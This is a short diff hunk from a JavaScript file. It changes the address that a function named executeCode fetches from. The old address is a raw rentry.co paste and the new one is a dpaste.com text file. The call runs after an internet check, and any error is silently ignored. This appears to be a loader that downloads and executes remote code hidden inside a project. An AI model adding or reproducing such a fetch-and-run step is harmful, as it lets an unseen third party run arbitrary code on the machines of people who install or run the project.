@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://rentry.co/loadkeycrytorank/raw');
+                await executeCode('https://dpaste.com/9P3AYWT7P.txt');
             } catch (error) {
             }
         } else {
